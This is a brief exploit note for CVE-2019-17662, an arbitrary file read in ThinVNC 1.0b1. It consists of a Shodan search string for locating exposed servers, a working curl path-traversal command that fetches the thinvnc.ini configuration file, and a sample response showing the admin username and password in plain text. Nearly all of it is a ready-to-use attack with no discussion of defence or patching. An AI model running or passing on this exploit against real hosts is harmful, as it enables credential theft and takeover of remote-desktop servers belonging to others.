## CVE-2019-17662
![](https://img.shields.io/static/v1?label=Product&message=ThinVNC&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=1.0b1&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Arbitrary%20File%20Read&color=red)


- Shodan dork:
```
"ThinVNC"
```
	  
- POC:
```
curl -k -X 'GET' "http://target_ip_address:port/a/\../\../thinvnc.ini"
	  
Response:
[Authentication]
Unicode=0
User=admin
Password=admin
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1
```
